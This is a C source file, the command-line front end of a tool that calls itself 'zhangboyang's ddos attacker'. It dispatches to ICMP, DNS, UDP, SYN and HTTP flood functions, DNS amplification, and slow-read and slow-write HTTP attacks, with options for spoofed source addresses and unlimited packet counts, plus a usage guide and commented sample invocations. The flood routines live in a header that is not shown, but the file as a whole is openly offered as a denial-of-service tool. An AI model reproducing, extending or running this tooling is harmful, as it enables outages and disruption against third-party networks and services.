#include "common.h"

struct in_addr parse_addr(const char *str)
{
    struct in_addr r;
    if (!inet_aton(str, &r)) fail("can't parse ip '%s'.", str);
    return r;
}

struct ddos_flags parse_flags(const char *str)
{
    struct ddos_flags r;
    memset(&r, 0, sizeof(r));
    r.ip_spoof = !!strchr(str, 'a');
    r.rand_sport = !!strchr(str, 'p');
    while (*str) {
        if (!strchr("xap", *str)) fail("invalid flag '%c'.", *str);
        str++;
    }
    return r;
}


int main(int argc, char *argv[])
{
    printf("  welcome to zhangboyang's ddos attacker\n");
    
    if (getuid() != 0) printf("  warning: please run this program as root.\n");
    
    if (argc == 6 && strcmp(argv[1], "icmpflood") == 0) {
        icmp_flood(parse_addr(argv[2]), parse_addr(argv[3]), parse_flags(argv[4]), atoll(argv[5]));
    } else if (argc == 6 && strcmp(argv[1], "dnsflood") == 0) {
        dns_flood(parse_addr(argv[2]), parse_addr(argv[3]), parse_flags(argv[4]), atoll(argv[5]));
    } else if (argc == 5 && strcmp(argv[1], "dnsreflect") == 0) {
        dns_amplification(parse_addr(argv[2]), parse_addr(argv[3]), atoll(argv[4]));
    } else if (argc == 8 && strcmp(argv[1], "udpflood") == 0) {
        struct bytevector vec; bytevector_init(&vec);
        printf("  please write udp packet data to stdin.\n");
        int ch; while ((ch = getchar()) != EOF) bytevector_append_u8(&vec, ch);
        udp_flood(parse_addr(argv[2]), atoi(argv[3]), parse_addr(argv[4]), atoi(argv[5]), bytevector_data(&vec), bytevector_size(&vec), NULL, parse_flags(argv[6]), atoll(argv[7]));
        bytevector_free(&vec);
    } else if (argc == 8 && strcmp(argv[1], "synflood") == 0) {
        syn_flood(parse_addr(argv[2]), atoi(argv[3]), parse_addr(argv[4]), atoi(argv[5]), parse_flags(argv[6]), atoll(argv[7]));
    } else if (argc == 9 && strcmp(argv[1], "httpflood") == 0) {
        http_flood(parse_addr(argv[2]), atoi(argv[3]), argv[4], argv[5], atoi(argv[6]), atoi(argv[7]), atoi(argv[8]));
    } else if (argc == 10 && strcmp(argv[1], "httpslowread") == 0) {
        http_slowread(parse_addr(argv[2]), atoi(argv[3]), argv[4], argv[5], atoi(argv[6]), atoi(argv[7]), atoi(argv[8]), atoi(argv[9]));
    } else if (argc == 8 && strcmp(argv[1], "httpslowwrite") == 0) {
        http_slowwrite(parse_addr(argv[2]), atoi(argv[3]), argv[4], argv[5], atoi(argv[6]), atoi(argv[7]));
    } else if (argc >= 1) {        
        printf("  usage:\n");
        //           0  1         2       3       4       5
        printf("     %s icmpflood [srcip] [dstip] [flags] [count]\n", argv[0]);
        printf("     %s dnsflood  [srcip] [dstip] [flags] [count]\n", argv[0]);
        //           0  1          2           3       4
        printf("     %s dnsreflect [dnsserver] [dstip] [count]\n", argv[0]);
        //           0  1        2       3         4       5         6       7
        printf("     %s udpflood [srcip] [srcport] [dstip] [dstport] [flags] [count]\n", argv[0]);
        printf("     %s synflood [srcip] [srcport] [dstip] [dstport] [flags] [count]\n", argv[0]);
        //           0  1             2       3         4      5      6             7
        printf("     %s httpflood     [dstip] [dstport] [host] [path] [connections] [request_per_conn] [wait_time]\n", argv[0]);
        printf("     %s httpslowread  [dstip] [dstport] [host] [path] [connections] [read_size] [read_wait] [timeout]\n", argv[0]);
        printf("     %s httpslowwrite [dstip] [dstport] [host] [path] [connections] [write_wait]\n", argv[0]);
        
        printf("  notes:\n");
        printf("     [count]: -1 means infinity\n");
        printf("     [flags]: 'x' for none, 'a' for random srcip, 'p' for random srcport (if applicable)\n");
        printf("     [time] : unit is milliseconds\n");
    } else {
        printf("error\n");
    }
    return 1;
    
    //inet_aton("192.168.0.111", &src);
    
    //flags.ip_spoof = 1;
    //icmp_flood(src, dst, flags, -1);
    
    //flags.rand_sport=1;
    //udp_flood(src, 1234, dst, 5678, "123", 3, NULL, flags, -1);
    
    //dns_flood(src, dst, flags, -1);
    //inet_aton("192.168.0.1", &src);
    //dns_amplification(src, dst, -1);  
    //syn_flood(src, 0, dst, 80, flags, -1);
    
    //http_flood(dst, 80, "192.168.0.109", "/", 1000, 90, 2000);
    
    //http_slowread(dst, 80, "192.168.0.109", "/", 10, 10, 1000, 500000);
    
    //http_slowwrite(dst, 80, "192.168.0.109", "/", 100, 5000);
}
